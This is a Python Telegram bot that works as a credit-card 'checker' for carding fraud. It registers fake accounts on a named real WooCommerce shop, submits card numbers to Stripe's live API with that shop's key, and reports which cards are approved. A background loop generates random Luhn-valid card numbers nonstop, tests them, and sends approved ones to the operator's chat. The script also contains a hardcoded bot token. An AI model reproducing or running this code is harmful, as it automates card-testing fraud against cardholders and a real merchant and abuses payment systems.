import telebot
import requests
import re
import random
import string
import time
import threading
from concurrent.futures import ThreadPoolExecutor

# ============ CONFIG ============
BOT_TOKEN = "8722822889:AAEBOVPUGVfTpRnr1aOGho4f7EVo9yUHE8M"          # @BotFather से
ADMIN_ID = 8279891640                  # अपनी Chat ID

# ============ STRIPE CONFIG (Script से लिया) ============
B = "https://shop.nemaneide.com"
PK = "pk_live_51ROOSi03FG8Au2CBvmO4o6DP0qA0RZrRrfZOnaBDsGPJGmufqblXi5kMzp8RwDVwaKd8ggjdazNJV7X72tBgnoFs00BuEsszoz"
UA = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"

bot = telebot.TeleBot(BOT_TOKEN)

# ============ HELPERS ============
rnd = lambda k: ''.join(random.choices(string.hexdigits.lower(), k=k))
fn  = lambda h, k: (m := re.search(rf'name="{k}"\s+value="([^"]+)"', h, re.I)) and m.group(1)
jn  = lambda h, k: (m := re.search(rf'"{k}"\s*:\s*"([^"]+)"', h)) and m.group(1)
icon = lambda s: '✅' if s == 'APPROVED' else '❌' if s == 'DECLINED' else '⚠️'

# ============ STRIPE CHECK ============
def run(inp):
    p = inp.strip().split('|')
    if len(p) != 4:
        return "ERROR", "Invalid format"

    cc, mm, yy, cvv = p
    yy = yy[-2:] if len(yy) == 4 else yy
    s  = requests.Session()
    s.headers['user-agent'] = UA

    # 1. Fake Account Create
    r = s.get(f"{B}/my-account/", timeout=30)
    n = fn(r.text, 'woocommerce-register-nonce')
    if not n:
        return "ERROR", "No register nonce"

    s.post(f"{B}/my-account/",
        headers={'content-type': 'application/x-www-form-urlencoded', 'origin': B, 'referer': f'{B}/my-account/'},
        data={'email': f"{''.join(random.choices(string.ascii_lowercase, k=6))}{rnd(3)}@gmail.com",
              'password': rnd(12), 'woocommerce-register-nonce': n,
              '_wp_http_referer': '/my-account/', 'register': 'Registracija'}, timeout=30)
    time.sleep(0.5)

    # 2. Setup Intent Nonce
    r2 = s.get(f"{B}/my-account/payment-methods/", headers={'referer': f'{B}/my-account/'}, timeout=30)
    an = jn(r2.text, 'createAndConfirmSetupIntentNonce')
    if not an:
        return "ERROR", "No ajax nonce"
    time.sleep(0.3)

    # 3. Stripe Payment Method Create
    d = s.post('https://api.stripe.com/v1/payment_methods',
        headers={'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'},
        data={'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
              'card[exp_year]': yy, 'card[exp_month]': mm.zfill(2),
              'billing_details[address][country]': 'MO', 'key': PK,
              '_stripe_version': '2024-06-20',
              'payment_user_agent': 'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent',
              'guid': rnd(48), 'muid': rnd(32), 'sid': rnd(32),
              'time_on_page': str(random.randint(5000, 15000))}, timeout=30).json()

    if 'error' in d:
        return "DECLINED", d['error'].get('message', 'Declined')
    if 'id' not in d:
        return "ERROR", "Unexpected response"
    time.sleep(0.3)

    # 4. Confirm Setup Intent
    res = s.post(f"{B}/", params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
        headers={'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': B,
                 'referer': f'{B}/my-account/add-payment-method/', 'x-requested-with': 'XMLHttpRequest'},
        data={'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': d['id'],
              'wc-stripe-payment-type': 'card', '_ajax_nonce': an}, timeout=60).json()

    if res.get('success'):
        return "APPROVED", "Payment Method Added"

    dt = res.get('data', {})
    if isinstance(dt, dict):
        if dt.get('status') == 'requires_action':
            return "DECLINED", "Requires Action (3DS)"
        e = dt.get('error', {})
        return "DECLINED", (e.get('message', 'Unknown') if isinstance(e, dict) else str(e))
    return "DECLINED", str(dt)

# ============ FORMAT ============
def format_result(cc, status, msg, elapsed):
    lines = []
    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append("💳 **STRIPE CC CHECKER**")
    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")
    lines.append(f"🔢 **CC:** `{cc}`")
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append("**🔍 CHECK RESULT**")
    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")
    lines.append(f"{icon(status)} **Status:** `{status}`")
    lines.append(f"📝 **Response:** `{msg}`")
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"🕒 **Time:** `{elapsed:.2f}s`")
    lines.append(f"🤖 **Bot by:** @Ron875")
    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append("✨ **Premium Channel** ✨")
    return "\n".join(lines)

# ============ BOT COMMANDS ============
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message,
        "🤖 **STRIPE CC CHECKER BOT**\n\n"
        "🔥 **Commands:**\n"
        "`/chk cc|mm|yy|cvv` – Check Single CC\n"
        "`/start` – Help\n\n"
        "✅ **Real Stripe Response**\n"
        f"👤 **Admin:** `{ADMIN_ID}`"
    )

@bot.message_handler(commands=['chk'])
def check_cmd(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ **Usage:** `/chk number|mm|yy|cvv`")
        return
    
    cc_input = args[1]
    t = time.time()
    status, msg = run(cc_input)
    elapsed = time.time() - t
    
    formatted = format_result(cc_input, status, msg, elapsed)
    bot.reply_to(message, formatted, parse_mode='Markdown')
    
    # Admin को भेजो (सिर्फ Approved)
    if status == 'APPROVED':
        bot.send_message(ADMIN_ID, formatted, parse_mode='Markdown')

# ============ CONTINUOUS GENERATOR (नॉनस्टॉप) ============
def continuous_generator():
    print("🚀 Stripe CC Checker Started...")
    print(f"👤 Admin: {ADMIN_ID}")
    
    while True:
        try:
            # रैंडम CC जेनरेट करो (Luhn + Random BIN)
            bin_prefix = random.choice(['4', '5']) + ''.join(str(random.randint(0, 9)) for _ in range(5))
            for _ in range(200):
                cc_num = bin_prefix + ''.join(str(random.randint(0, 9)) for _ in range(15 - len(bin_prefix)))
                if luhn_check(cc_num):
                    year = random.randint(2026, 2035)
                    month = random.randint(1, 12)
                    cvv = ''.join(str(random.randint(0, 9)) for _ in range(3))
                    cc_input = f"{cc_num}|{month:02d}|{str(year)[2:]}|{cvv}"
                    break
            else:
                time.sleep(1)
                continue
            
            # CC Check
            t = time.time()
            status, msg = run(cc_input)
            elapsed = time.time() - t
            
            formatted = format_result(cc_input, status, msg, elapsed)
            
            # सिर्फ Approved भेजो
            if status == 'APPROVED':
                bot.send_message(ADMIN_ID, formatted, parse_mode='Markdown')
                print(f"✅ Approved: {cc_input}")
            else:
                print(f"❌ {status}: {cc_input}")
            
            time.sleep(1)
            
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)

def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]
    checksum = 0
    for i in range(len(digits) - 2, -1, -2):
        doubled = digits[i] * 2
        checksum += doubled if doubled < 10 else doubled - 9
    for i in range(len(digits) - 1, -1, -2):
        checksum += digits[i]
    return checksum % 10 == 0

# ============ MAIN ============
if __name__ == "__main__":
    # Generator को background thread में चलाओ
    threading.Thread(target=continuous_generator, daemon=True).start()
    print("✅ बॉट चालू है...")
    bot.infinity_polling()